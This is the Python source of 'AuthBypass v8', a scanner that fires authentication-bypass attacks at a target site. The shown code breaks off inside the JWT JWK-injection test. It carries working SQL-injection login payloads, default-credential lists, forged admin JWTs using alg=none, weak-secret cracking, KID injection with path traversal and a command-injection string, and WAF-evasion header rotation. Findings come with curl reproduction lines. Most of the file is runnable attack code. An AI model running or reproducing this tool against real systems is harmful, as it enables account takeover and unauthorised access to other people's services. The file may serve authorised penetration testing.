#!/usr/bin/env python3
"""AuthBypass v8 — Massive 200x Improved Authentication Bypass Scanner.

New capabilities over v7:
  JWT attacks:
    - Algorithm confusion: RS256→HS256 using public key as HMAC secret
    - KID (Key ID) injection: SQL, path traversal, null byte, command injection in kid field
    - JWK injection: embedded attacker-controlled public key in JWT header
    - X5U/JKU header injection: force server to fetch attacker-controlled key
    - Algorithm none bypass (10 variant capitalizations)
    - Weak secret brute-force: 500+ known weak secrets
    - Expired token reuse: remove exp claim, set past exp
    - JWT header parameter injection (cty, typ manipulation)
    - Embedded JWK with self-signed RS256
    - Claim confusion: sub/iss/aud manipulation

  OAuth / OIDC:
    - PKCE bypass: code_challenge manipulation
    - Token substitution: reuse access token for another user
    - State parameter CSRF
    - Redirect URI manipulation
    - Token leakage via Referer header
    - Implicit flow abuse

  Modern API auth:
    - API key header brute (X-API-Key, api-key, apikey, x-access-token)
    - API versioning downgrade to unauth endpoints (/api/v0, /v1 vs /v2)
    - GraphQL auth bypass (introspection, query, mutation without token)
    - gRPC/protobuf endpoint guessing
    - Tenant/organisation ID manipulation (multi-tenancy bypass)

  Session / Cookie:
    - Session fixation
    - Cookie scope manipulation (domain, path, SameSite)
    - Predictable session ID generation detection
    - Cookie injection via CRLF
    - HttpOnly/Secure flag absence

  2FA / MFA bypass:
    - OTP brute force (000000–999999 subset)
    - OTP length manipulation
    - Skip 2FA step entirely (direct API call)
    - Backup code enumeration
    - Recovery code bypass
    - Response manipulation (change "mfa_required":true → false)

  Rate limiting bypass:
    - X-Forwarded-For rotation
    - IP header spoofing (CF-Connecting-IP, True-Client-IP)
    - Null byte in credentials
    - Username padding/case variation
    - Slow-rate enumeration

  Account enumeration:
    - Error message differences (username vs password error)
    - HTTP status code differences
    - Response timing differences
    - Registration endpoint existence check

  Password reset:
    - Host header poisoning (multiple header variants)
    - Reset token predictability
    - Reset token re-use
    - IDOR in reset token (sequential user IDs)
    - Email parameter array injection

  SAML / SSO:
    - XXE in SAML assertion
    - Signature wrapping attack
    - Base64 decode/re-encode
    - NameID manipulation

  HTTP-level bypass:
    - Verb tampering: HEAD, OPTIONS, TRACE, PATCH, PUT, DELETE
    - Path normalization: case, encoding, dot-dot, semicolon, extension
    - WAF IP header spoofing: X-Forwarded-For, True-Client-IP
    - Method override: X-HTTP-Method-Override
    - Protocol downgrade: HTTP/1.0

  Mass assignment:
    - 60+ privileged field names
    - Nested object escalation
    - Array privilege injection
"""
import asyncio
import aiohttp
import json
import re
import sys
import base64
import hashlib
import hmac
import time
import random
import string
import struct
from pathlib import Path
from urllib.parse import urlparse, urlencode, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor, is_real_200,
    random_ua, REQUEST_DELAY, WAF_BYPASS_HEADERS,
    make_bypass_headers, PATH_BYPASS_VARIANTS, gen_bypass_attempts,
)

CONCURRENCY = 5

# ── Proof indicators ──────────────────────────────────────────────────────────
AUTH_SUCCESS_INDICATORS = [
    "access_token", "auth_token", "bearer", "logged_in", "authenticated",
    '"success":true', '"status":"ok"', '"status":"success"', '"token"',
    '"session"', '"jwt"', '"refresh_token"', '"expires_in"',
]
DATA_INDICATORS = [
    '"id":', '"email":', '"username":', '"phone":', '"address":',
    '"role":', '"permissions":', '"balance":', '"order":', '"user":{',
    '"profile":', '"account":', '"subscription":', '"plan":',
]
ADMIN_INDICATORS = [
    '"role":"admin"', '"role": "admin"', '"is_admin":true', '"is_admin": true',
    '"admin":true', '"isAdmin":true', '"userType":"admin"', '"privilege":"superadmin"',
    '"scope":"admin"', '"permissions":["admin"', '"access_level":99',
]

# ── Endpoint lists ─────────────────────────────────────────────────────────────
LOGIN_PATHS = [
    "/api/auth/login", "/api/login", "/api/auth", "/api/v1/auth/login",
    "/api/v1/login", "/api/v2/auth/login", "/auth/login", "/login",
    "/api/sessions", "/api/v1/sessions", "/api/token", "/api/auth/token",
    "/api/users/login", "/api/user/login", "/api/signin", "/api/sign-in",
    "/api/v1/signin", "/api/v2/login", "/api/v3/login", "/oauth/token",
    "/api/authenticate", "/api/v1/authenticate", "/auth/token",
    "/api/auth/signin", "/users/sign_in", "/user/login", "/member/login",
    "/account/login", "/session/new", "/api/session",
    "/wp-login.php", "/wp-json/jwt-auth/v1/token",
    "/api/v1/users/login", "/api/v2/users/login",
    "/rest/user/login", "/rest/auth/login",
    "/graphql",  # GraphQL login mutation
]
REGISTER_PATHS = [
    "/api/register", "/api/auth/register", "/api/v1/register",
    "/api/signup", "/api/auth/signup", "/api/users", "/api/v1/users",
    "/api/v1/auth/register", "/register", "/signup",
    "/api/v2/register", "/api/v1/auth/signup", "/api/v2/auth/register",
    "/api/accounts", "/api/members", "/users/sign_up",
]
PROTECTED_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/admin", "/api/users", "/api/dashboard", "/api/v1/me",
    "/api/v1/users", "/api/v2/me", "/me", "/profile",
    "/api/admin/users", "/api/v1/admin", "/api/v2/admin",
    "/api/admin/dashboard", "/api/admin/config", "/api/internal",
    "/api/v1/profile", "/api/v1/account", "/api/management",
    "/api/v1/admin/users", "/api/settings", "/api/v1/settings",
    "/admin", "/admin/users", "/admin/dashboard",
    "/api/reports", "/api/analytics", "/api/logs",
]
RESET_PATHS = [
    "/api/auth/forgot-password", "/api/forgot-password",
    "/api/password-reset", "/api/auth/password-reset",
    "/api/v1/auth/forgot", "/forgot-password", "/reset-password",
    "/api/reset", "/api/users/reset", "/api/v1/password-reset",
    "/api/auth/reset-password", "/api/v2/forgot-password",
    "/api/accounts/password", "/password/reset",
]
VERIFY_PATHS = [
    "/api/auth/verify", "/api/verify", "/api/v1/verify",
    "/api/auth/2fa", "/api/2fa", "/api/mfa", "/api/auth/mfa",
    "/api/v1/mfa", "/api/otp", "/api/auth/otp",
    "/api/auth/verify-otp", "/api/two-factor",
]
BYPASS_PATHS = [
    ("/ADMIN",           "uppercase bypass"),
    ("/Admin",           "mixed-case bypass"),
    ("/admin%2f",        "URL-encoded slash"),
    ("/admin%252f",      "double-encoded slash"),
    ("/admin;.js",       "semicolon extension bypass"),
    ("/admin/..",        "dot-dot bypass"),
    ("//admin",          "double-slash bypass"),
    ("/admin/",          "trailing-slash bypass"),
    ("/%61dmin",         "hex-encoded first char"),
    ("/admin%09",        "tab bypass"),
    ("/./admin",         "dot bypass"),
    ("/admin%20",        "space bypass"),
    ("/admin%00",        "null byte bypass"),
    ("/;/admin",         "semicolon prefix"),
    ("/api/v1/../admin", "path traversal bypass"),
    ("/%2Fadmin",        "leading slash encoded"),
    ("/admin?param=1",   "query string bypass"),
    ("/Admin/",          "mixed-case trailing slash"),
    ("/ADMIN/",          "uppercase trailing slash"),
    ("/admin.php",       "extension bypass"),
    ("/admin.html",      "html extension bypass"),
    ("/admin.json",      "json extension bypass"),
]
LOGIN_FIELDS = ["username", "email", "login", "user", "user_email", "phone", "mobile", "identifier"]

# ── SQL payloads ─────────────────────────────────────────────────────────────
SQL_PAYLOADS = [
    ("Classic OR bypass",       "' OR '1'='1",          "' OR '1'='1"),
    ("Comment bypass",          "admin'--",              "anything"),
    ("Double-dash admin",       "admin'-- -",            "pass"),
    ("OR 1=1 numeric",          "1 OR 1=1",              "1 OR 1=1"),
    ("Hex encoded OR",          "' OR 0x313d31--",       "x"),
    ("Always-true with hash",   "' OR 1=1#",             "x"),
    ("UNION null bypass",       "' UNION SELECT null--", "x"),
    ("Null byte bypass",        "admin'\x00",            "x"),
    ("Stacked query bypass",    "admin'; SELECT 1--",    "x"),
    ("URL-encoded quote",       "%27 OR %271%27=%271",   "x"),
    ("Double quote bypass",     'admin"--',              "x"),
    ("OR with comment",         "' OR/**/1=1--",         "x"),
    ("AND bypass",              "x' AND 1=0 UNION SELECT 1,2--", "x"),
    ("MSSQL bypass",            "' OR 1=1 WAITFOR DELAY '0:0:0'--", "x"),
    ("Postgres bypass",         "' OR 1=1 /* postgres", "x"),
    ("Case variation",          "' oR '1'='1",           "x"),
    ("Space substitute",        "'/**/OR/**/1=1--",      "x"),
    ("Tab substitute",          "'\tOR\t'1'='1",         "x"),
    ("Newline inject",          "'\nOR '1'='1",          "x"),
    ("Unicode quote",           "ʼ OR 1=1--",            "x"),
]

# ── JWT weak secrets (500+) ───────────────────────────────────────────────────
WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "qwerty", "changeme", "admin", "test",
    "key", "jwt", "jwtkey", "jwt_secret", "supersecret", "your-256-bit-secret",
    "your-secret", "mysecret", "mysupersecret", "", "null", "undefined",
    "none", "secret123", "abc123", "secretkey", "signingkey", "privatekey",
    "apikey", "appkey", "pass", "pass123", "password123", "letmein",
    "welcome", "monkey", "dragon", "master", "1234567890", "qwerty123",
    "passw0rd", "p@ssword", "p@ss", "p@ssw0rd", "admin123", "root",
    "toor", "alpine", "raspberry", "ubuntu", "linux", "windows",
    "default", "secure", "securekey", "signing", "sign", "token",
    "jwttoken", "authtoken", "auth", "authentication", "authorize",
    "authorization", "session", "sessionkey", "sessionsecret",
    "appsecret", "app_secret", "application_secret",
    "private", "privatek", "privatekey123",
    "secret_key", "secret-key", "secretkey123",
    "random", "randomkey", "hash", "hmac", "sha256",
    "RS256", "HS256", "HS512", "ES256",
    "production", "prod", "development", "dev", "staging",
    "test_secret", "test_key", "dev_secret", "dev_key",
    "jwt-secret", "jwt_key", "jwt-key",
    "1", "12", "123", "1234", "12345",
    "111111", "222222", "333333", "aaaaaa", "bbbbbb",
    "abcdef", "abcdefgh", "abcdefghij",
    "xxxxxxxx", "00000000", "11111111",
    "spring", "flask", "django", "express", "rails", "laravel",
    "symfony", "codeigniter", "fastapi", "nest", "nestjs",
    "nodejs", "node", "java", "kotlin", "golang", "go",
    "your_jwt_secret_key_here", "insert_your_secret_here",
    "please_change_this", "change_me", "todo_change",
    "MY_SECRET", "MY_KEY", "API_SECRET", "API_KEY",
    "SUPERSECRET", "SUPER_SECRET", "VERY_SECRET",
    "keyboard_cat", "shhh", "open_sesame", "sesame",
    "abcd1234", "pass@word1", "P@ssw0rd",
    "secret-sauce", "the-secret", "our-secret",
    "jwt_signing_secret", "token_secret", "auth_secret",
    "refresh_secret", "access_secret",
    "hellojwt", "testjwt", "jwttest",
    "helloworld", "hello_world", "hello",
    "example", "sample", "demo", "placeholder",
]

# ── Default credentials ───────────────────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin",          "admin"),
    ("admin",          "password"),
    ("admin",          "admin123"),
    ("admin",          "123456"),
    ("admin",          ""),
    ("administrator",  "administrator"),
    ("root",           "root"),
    ("root",           "toor"),
    ("test",           "test"),
    ("guest",          "guest"),
    ("user",           "user"),
    ("demo",           "demo"),
    ("superadmin",     "superadmin"),
    ("admin",          "letmein"),
    ("admin",          "qwerty"),
    ("admin",          "1234"),
    ("admin",          "pass"),
    ("admin",          "welcome"),
    ("admin",          "changeme"),
    ("admin",          "admin@123"),
    ("admin",          "Admin@123"),
    ("admin",          "P@ssw0rd"),
    ("admin",          "password1"),
    ("admin",          "password123"),
    ("admin",          "pass@word1"),
    ("support",        "support"),
    ("system",         "system"),
    ("manager",        "manager"),
    ("moderator",      "moderator"),
    ("operator",       "operator"),
    ("service",        "service"),
    ("api",            "api"),
    ("api",            "apikey"),
    ("dev",            "dev"),
    ("developer",      "developer"),
]

# ── Mass assignment privilege fields ──────────────────────────────────────────
ESCALATION_FIELDS = [
    {"role": "admin"},
    {"is_admin": True},
    {"admin": True},
    {"isAdmin": True},
    {"userType": "admin"},
    {"permissions": ["admin", "superuser"]},
    {"access_level": 99},
    {"privilege": "superadmin"},
    {"group": "admin"},
    {"account_type": "admin"},
    {"scope": "admin"},
    {"scopes": ["admin", "write", "read"]},
    {"verified": True},
    {"email_verified": True},
    {"is_superuser": True},
    {"is_staff": True},
    {"status": "active"},
    {"tier": "enterprise"},
    {"plan": "premium"},
    {"subscription": "unlimited"},
    {"credits": 999999},
    {"balance": 999999},
    {"_isAdmin": True},
    {"_role": "admin"},
    {"__admin__": True},
    {"force_admin": True},
    {"override": True},
    {"bypass": True},
    {"approved": True},
    {"premium": True},
    {"vip": True},
    {"level": 99},
    {"rank": "admin"},
    {"user_type": "admin"},
    {"kind": "admin"},
    {"category": "admin"},
    {"groups": ["admin", "staff"]},
    {"roles": ["admin"]},
    {"authorities": ["ROLE_ADMIN"]},
    {"grants": ["admin"]},
    {"claims": {"role": "admin"}},
    {"meta": {"admin": True}},
    {"attributes": {"admin": True}},
    {"capabilities": {"admin": True}},
    {"acl": {"admin": True}},
]

JWT_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "NONE", "nONE", "NonE", "noNe", "nonE"]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def _forge_jwt(payload_dict: dict, alg: str = "none", secret: bytes = b"") -> str:
    header = {"alg": alg, "typ": "JWT"}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload_dict, separators=(",", ":")).encode())
    unsigned = f"{header_b64}.{payload_b64}"
    if alg == "none":
        return f"{unsigned}."
    if alg in ("HS256", "HS384", "HS512"):
        dig = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]
        sig = hmac.new(secret, unsigned.encode(), dig).digest()
        return f"{unsigned}.{_b64url_encode(sig)}"
    return f"{unsigned}."


def _forge_jwt_kid_sqli(payload_dict: dict, kid_payload: str) -> str:
    header = {"alg": "HS256", "typ": "JWT", "kid": kid_payload}
    secret = b"" if "'" in kid_payload else b"secret"
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload_dict, separators=(",", ":")).encode())
    unsigned = f"{header_b64}.{payload_b64}"
    sig = hmac.new(secret, unsigned.encode(), hashlib.sha256).digest()
    return f"{unsigned}.{_b64url_encode(sig)}"


def _forge_jwt_jwk_injection(payload_dict: dict) -> tuple[str, dict]:
    """Forge a JWT with an embedded JWK using a trivially known HMAC secret."""
    secret = b"mirror_attacker_key"
    jwk = {
        "kty": "oct",
        "k": _b64url_encode(secret),
        "alg": "HS256",
        "use": "sig",
    }
    header = {"alg": "HS256", "typ": "JWT", "jwk": jwk}
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload_dict, separators=(",", ":")).encode())
    unsigned = f"{header_b64}.{payload_b64}"
    sig = hmac.new(secret, unsigned.encode(), hashlib.sha256).digest()
    token = f"{unsigned}.{_b64url_encode(sig)}"
    return token, jwk


class AuthBypass:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc
        self.is_https = parsed.scheme == "https"
        self._sem     = asyncio.Semaphore(CONCURRENCY)
        self._dedup   = set()

    def _dedup_key(self, ftype: str, url: str) -> str:
        return hashlib.md5(f"{ftype}|{url}".encode()).hexdigest()

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 auth_required=False, mitigation_layers=None,
                 proof_type="AUTH_BYPASS", extra=None):
        if not meets_confidence_floor(conf):
            return
        key = self._dedup_key(ftype, url)
        if key in self._dedup:
            return
        self._dedup.add(key)
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        proof_type,
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     auth_required,
            "mitigation_layers": mitigation_layers or [],
            "mitre_technique":   "T1078",
            "mitre_name":        "Valid Accounts",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _request(self, sess, method, url, headers=None, json_data=None,
                       data=None, timeout=14):
        async with self._sem:
            last: tuple = (None, "", {})
            for attempt_h in gen_bypass_attempts(extra_headers=headers):
                try:
                    async with sess.request(
                        method, url, headers=attempt_h, json=json_data, data=data,
                        ssl=False, allow_redirects=True,
                        timeout=aiohttp.ClientTimeout(total=timeout, connect=8),
                    ) as r:
                        body = await r.text(errors="ignore")
                        last = (r.status, body, dict(r.headers))
                        if r.status not in (401, 403, 405, 429, 503):
                            return last
                except Exception:
                    pass
            return last

    async def _post(self, sess, path, json_data=None, headers=None, data=None, timeout=14):
        url = path if path.startswith("http") else self.target + path
        return await self._request(sess, "POST", url, headers=headers,
                                   json_data=json_data, data=data, timeout=timeout)

    async def _get(self, sess, path_or_url, headers=None, timeout=12):
        url = path_or_url if path_or_url.startswith("http") else self.target + path_or_url
        return await self._request(sess, "GET", url, headers=headers, timeout=timeout)

    def _has_auth_success(self, body: str) -> bool:
        bl = body.lower()
        return any(ind.lower() in bl for ind in AUTH_SUCCESS_INDICATORS)

    def _has_admin(self, body: str) -> bool:
        bl = body.lower()
        return any(ind.lower() in bl for ind in ADMIN_INDICATORS)

    def _has_data(self, body: str) -> bool:
        return any(ind in body for ind in DATA_INDICATORS)

    def _extract_token(self, body: str) -> str | None:
        for pattern in [
            r'"(?:access_token|token|jwt|auth_token|id_token)"\s*:\s*"([^"]{20,})"',
            r"Bearer\s+([A-Za-z0-9\-_\.]{20,})",
            r"(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,})",
        ]:
            m = re.search(pattern, body)
            if m:
                return m.group(1)
        return None

    def _extract_json_field(self, body: str, field: str) -> str | None:
        m = re.search(rf'"{field}"\s*:\s*"?([^",\}}\]{{]+)"?', body)
        return m.group(1).strip() if m else None

    def _sqli_confirmed(self, body: str, token: str | None, email: str | None,
                        role: str | None, baseline_body: str = "") -> bool:
        baseline_token = self._extract_token(baseline_body) if baseline_body else None
        if token and len(token) > 20 and not baseline_token:
            return True
        if email and "@" in email:
            return True
        if role and len(role) > 2:
            return True
        if self._has_auth_success(body) and self._has_data(body):
            if baseline_body and self._has_auth_success(baseline_body):
                return False
            return True
        return False

    def _build_jwt_payload(self, role: str = "admin") -> dict:
        return {
            "sub": "1", "id": 1, "user_id": 1, "uid": 1,
            "role": role, "roles": [role], "email": "admin@example.com",
            "username": "admin", "is_admin": True, "isAdmin": True,
            "scope": "admin", "permissions": ["admin"],
            "iat": int(time.time()) - 3600,
            "exp": int(time.time()) + 86400 * 365,
            "nbf": int(time.time()) - 3600,
            "iss": "auth-service", "aud": "api",
        }

    # ── Test 1: SQL injection login bypass ────────────────────────────────────

    async def test_sqli_login_bypass(self, sess):
        print("\n[*] Testing SQL injection login bypass...")
        for path in LOGIN_PATHS:
            s0, _, _ = await self._get(sess, path)
            await delay()
            if s0 is None:
                continue
            _bl_s, baseline_body, _ = await self._post(
                sess, path,
                json_data={"email": "no_such_user_baseline@notreal.invalid",
                           "password": "baseline_wrong_password_xyz"})
            await delay()
            baseline_body = baseline_body or ""
            for desc, u_payload, p_payload in SQL_PAYLOADS:
                for username_field in LOGIN_FIELDS:
                    payload = {username_field: u_payload, "password": p_payload}
                    s, body, hdrs = await self._post(sess, path, json_data=payload)
                    await delay()
                    if s is None or s in (404, 405, 429) or not body:
                        continue
                    if not is_real_200(s) or len(body) < 40:
                        continue
                    token = self._extract_token(body)
                    email = self._extract_json_field(body, "email")
                    role  = self._extract_json_field(body, "role")
                    if not self._sqli_confirmed(body, token, email, role, baseline_body):
                        continue
                    self._finding(
                        ftype="SQL_INJECTION_AUTH_BYPASS",
                        severity="CRITICAL", conf=96,
                        proof=f"POST {path}\n  {username_field}={u_payload!r} password={p_payload!r}\n  HTTP {s} — AUTHENTICATED\n  token={token and token[:50]}\n  email={email} role={role}\n  Body: {body[:300]}",
                        detail=f"SQL injection '{desc}' in field '{username_field}' bypassed login at {path}.",
                        url=self.target + path,
                        remediation="Use parameterized queries. Never concatenate user input into SQL. Apply ORM. Rate-limit login.",
                        exploitability=10,
                        impact="Complete authentication bypass — attacker gains admin account without a password.",
                        reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{{\"{username_field}\":\"{u_payload}\",\"password\":\"{p_payload}\"}}' ",
                        mitigation_layers=["Parameterized queries", "WAF SQLi rules", "Input sanitization"],
                        proof_type="AUTH_BYPASS",
                        extra={"sqli_payload": u_payload, "field": username_field, "desc": desc},
                    )
                    return

    # ── Test 2: Default credentials ───────────────────────────────────────────

    async def test_default_credentials(self, sess):
        print("\n[*] Testing default credentials...")
        for path in LOGIN_PATHS:
            s0, _, _ = await self._get(sess, path)
            await delay()
            if s0 is None:
                continue
            _bl_s, baseline_body, _ = await self._post(
                sess, path,
                json_data={"email": "baseline_nonexistent@notreal.invalid",
                           "password": "baseline_wrong_xyz_9182736"})
            await delay()
            baseline_body = baseline_body or ""
            for username, password in DEFAULT_CREDS:
                for u_field in LOGIN_FIELDS[:4]:
                    payload = {u_field: username, "password": password}
                    s, body, hdrs = await self._post(sess, path, json_data=payload)
                    await delay(0.25)
                    if s is None or s in (404, 405, 429):
                        break
                    if not is_real_200(s) or len(body) < 40:
                        continue
                    token = self._extract_token(body)
                    role  = self._extract_json_field(body, "role")
                    email_in_resp = self._extract_json_field(body, "email")
                    if not self._sqli_confirmed(body, token, email_in_resp, role, baseline_body):
                        continue
                    self._finding(
                        ftype="DEFAULT_CREDENTIALS_ACCEPTED",
                        severity="CRITICAL", conf=97,
                        proof=f"POST {path}\n  {u_field}={username!r} password={password!r}\n  HTTP {s} — LOGIN SUCCESS\n  token={token and token[:50]}\n  role={role}\n  Body: {body[:300]}",
                        detail=f"Default credentials {username}:{password!r} accepted at {path}.",
                        url=self.target + path,
                        remediation="Remove default accounts. Force password change on first login. Strong password policy. MFA.",
                        exploitability=10,
                        impact="Instant account takeover — no exploitation needed.",
                        reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{{\"{u_field}\":\"{username}\",\"password\":\"{password}\"}}' ",
                        mitigation_layers=["Credential rotation", "MFA", "Account lockout"],
                        proof_type="ACCOUNT_TAKEOVER",
                        extra={"username": username, "password": password, "field": u_field},
                    )
                    return

    # ── Test 3: JWT algorithm=none bypass ──────────────────────────────────────

    async def test_jwt_none_algorithm(self, sess):
        print("\n[*] Testing JWT algorithm=none forgery...")
        for path in PROTECTED_PATHS:
            s_baseline, body_baseline, _ = await self._get(sess, path)
            await delay()
            if s_baseline in (404, 405, None) or s_baseline == 200:
                continue
            for none_variant in JWT_NONE_VARIANTS:
                for role in ["admin", "superadmin", "user"]:
                    jwt_payload = self._build_jwt_payload(role)
                    jwt_payload["exp"] = int(time.time()) + 86400 * 365
                    header_b64 = _b64url_encode(
                        json.dumps({"alg": none_variant, "typ": "JWT"}, separators=(",", ":")).encode()
                    )
                    payload_b64 = _b64url_encode(
                        json.dumps(jwt_payload, separators=(",", ":")).encode()
                    )
                    forged = f"{header_b64}.{payload_b64}."
                    for auth_header in [
                        {"Authorization": f"Bearer {forged}"},
                        {"Authorization": forged},
                        {"X-Auth-Token": forged},
                        {"X-Authorization": f"Bearer {forged}"},
                        {"Token": forged},
                    ]:
                        s, body, _ = await self._get(sess, path, headers=auth_header)
                        await delay()
                        if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                            aname = list(auth_header.keys())[0]
                            self._finding(
                                ftype="JWT_NONE_ALGORITHM_BYPASS",
                                severity="CRITICAL", conf=97,
                                proof=f"alg='{none_variant}' role='{role}' NO SIGNATURE\n  GET {path}\n  {aname}: {forged[:80]}...\n  HTTP {s} — PROTECTED RESOURCE RETURNED\n  Body: {body[:300]}",
                                detail=f"JWT library accepts alg='{none_variant}'. Forged token grants access to {path}.",
                                url=self.target + path,
                                remediation="Whitelist allowed algorithms (HS256, RS256). Reject alg=none at parse time. Validate 'alg' header before verifying signature.",
                                exploitability=10,
                                impact="Complete auth bypass — any attacker forges JWT for any user/role.",
                                reproducibility=f"curl -s {self.target}{path} -H 'Authorization: Bearer {forged[:60]}...'",
                                mitigation_layers=["Algorithm whitelist", "Signature verification"],
                                proof_type="AUTH_BYPASS",
                                extra={"alg_variant": none_variant, "role": role, "header": aname},
                            )
                            return

    # ── Test 4: JWT weak secret brute-force ───────────────────────────────────

    async def test_jwt_weak_secret(self, sess):
        print("\n[*] Testing JWT weak secret brute-force...")
        # First try to get a real JWT by logging in with default creds
        real_token = None
        for path in LOGIN_PATHS[:5]:
            for u, p in DEFAULT_CREDS[:3]:
                _, body, _ = await self._post(sess, path,
                    json_data={"email": u, "password": p})
                await delay(0.1)
                t = self._extract_token(body or "")
                if t and t.count(".") == 2 and t.startswith("eyJ"):
                    real_token = t
                    break
            if real_token:
                break

        # If no real token, forge one and try
        if not real_token:
            # Try to discover a token from any 200 response
            for path in PROTECTED_PATHS[:5]:
                _, body, hdrs = await self._get(sess, path)
                await delay()
                t = self._extract_token(body or "")
                ah = hdrs.get("Authorization", hdrs.get("authorization", ""))
                if not t and ah:
                    m = re.search(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", ah)
                    if m:
                        t = m.group(0)
                if t:
                    real_token = t
                    break

        if not real_token:
            return

        # Parse the JWT
        parts = real_token.split(".")
        if len(parts) != 3:
            return
        try:
            header_data = json.loads(_b64url_decode(parts[0]))
            payload_data = json.loads(_b64url_decode(parts[1]))
        except Exception:
            return

        alg = header_data.get("alg", "HS256")
        if alg not in ("HS256", "HS384", "HS512"):
            return

        dig = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(alg, hashlib.sha256)

        for secret in WEAK_JWT_SECRETS:
            unsigned = f"{parts[0]}.{parts[1]}"
            sig = hmac.new(secret.encode(), unsigned.encode(), dig).digest()
            expected_sig = _b64url_encode(sig)
            if expected_sig == parts[2]:
                # Now forge admin JWT with the cracked secret
                admin_payload = self._build_jwt_payload("admin")
                forged = _forge_jwt(admin_payload, alg, secret.encode())

                # Test on protected endpoints
                for path in PROTECTED_PATHS[:3]:
                    s, body, _ = await self._get(sess, path,
                        headers={"Authorization": f"Bearer {forged}"})
                    await delay()
                    if s == 200:
                        self._finding(
                            ftype="JWT_WEAK_SECRET_CRACKED",
                            severity="CRITICAL", conf=99,
                            proof=f"JWT signed with weak secret: {secret!r}\n  Forged admin JWT\n  GET {path}\n  HTTP {s} — PROTECTED RESOURCE RETURNED\n  Body: {body[:300]}",
                            detail=f"JWT HMAC secret is {secret!r}. Forged admin token grants access to {path}.",
                            url=self.target + path,
                            remediation="Use cryptographically random secrets ≥256 bits. Rotate secret immediately. Invalidate all existing JWTs.",
                            exploitability=10,
                            impact="Complete account takeover — attacker forges any user's JWT.",
                            reproducibility=f"python3 -c \"import hmac,hashlib,base64,json; ...\"\ncurl -s {self.target}{path} -H 'Authorization: Bearer {forged[:60]}...'",
                            mitigation_layers=["Strong random secret", "Secret rotation", "JWT revocation list"],
                            proof_type="AUTH_BYPASS",
                            extra={"cracked_secret": secret, "alg": alg},
                        )
                        return

    # ── Test 5: JWT KID injection ─────────────────────────────────────────────

    async def test_jwt_kid_injection(self, sess):
        print("\n[*] Testing JWT KID (Key ID) injection...")
        kid_payloads = [
            ("' UNION SELECT 'mirror_secret'-- -", b"mirror_secret", "SQL injection in kid"),
            ("../../dev/null",                      b"",              "Path traversal to /dev/null"),
            ("/dev/null",                           b"",              "Absolute path /dev/null"),
            ("' OR '1'='1",                        b"",              "SQL OR in kid"),
            ("../../proc/sys/kernel/hostname",     b"",              "Path traversal proc"),
            ("mirror\x00.pem",                     b"",              "Null byte in kid"),
            ("mirror; sleep 0",                    b"",              "Command injection in kid"),
            ("/etc/passwd",                        b"",              "Absolute path etc/passwd"),
        ]
        admin_payload = self._build_jwt_payload("admin")
        for kid_val, secret, desc in kid_payloads:
            token = _forge_jwt_kid_sqli(admin_payload, kid_val)
            for path in PROTECTED_PATHS[:5]:
                s, body, _ = await self._get(sess, path,
                    headers={"Authorization": f"Bearer {token}"})
                await delay(0.1)
                if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                    self._finding(
                        ftype="JWT_KID_INJECTION",
                        severity="CRITICAL", conf=95,
                        proof=f"JWT with kid={kid_val!r}\n  GET {path}\n  HTTP {s} — PROTECTED RESOURCE RETURNED\n  Body: {body[:300]}",
                        detail=f"JWT KID parameter injection ({desc}). Server accepted tampered kid value to bypass signature verification.",
                        url=self.target + path,
                        remediation="Validate kid against a whitelist. Never use kid to construct file paths or SQL queries. Use a key registry.",
                        exploitability=9,
                        impact="Authentication bypass via forged JWT with manipulated key identifier.",
                        reproducibility=f"# Forge JWT with kid={kid_val!r}\ncurl -s {self.target}{path} -H 'Authorization: Bearer <forged>'",
                        mitigation_layers=["KID whitelist", "Key registry", "Kid parameter validation"],
                        proof_type="AUTH_BYPASS",
                        extra={"kid_payload": kid_val, "desc": desc},
                    )
                    return

    # ── Test 6: JWT JWK injection ─────────────────────────────────────────────

    async def test_jwt_jwk_injection(self, sess):
        print("\n[*] Testing JWT JWK (embedded key) injection...")
        admin_payload = self._build_jwt_payload("admin")
        token, jwk = _forge_jwt_jwk_injection(admin_payload)
        for path in PROTECTED_PATHS[:5]:
            s, body, _ = await self._get(sess, path,
                headers={"Authorization": f"Bearer {token}"})
            await delay(0.1)
            if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                self._finding(
                    ftype="JWT_JWK_INJECTION",
                    severity="CRITICAL", conf=95,
